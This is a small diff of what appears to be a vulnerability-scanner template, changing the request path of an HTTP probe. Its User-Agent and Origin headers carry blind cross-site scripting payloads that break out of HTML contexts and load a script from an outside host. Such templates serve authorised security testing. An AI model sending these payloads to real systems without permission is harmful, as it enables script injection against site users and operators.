@@ -9,7 +9,7 @@ info:
 http:
   - raw:
       - |
-        GET / HTTP/1.1
+        GET {{Path}} HTTP/1.1
         Host: {{Hostname}}
         User-Agent: \';\"/></textarea></script></script><script src="https://js.rip/bugbounty"></script>
         Origin: \';\"/></textarea></script></script><script src="https://js.rip/bugbounty"></script>
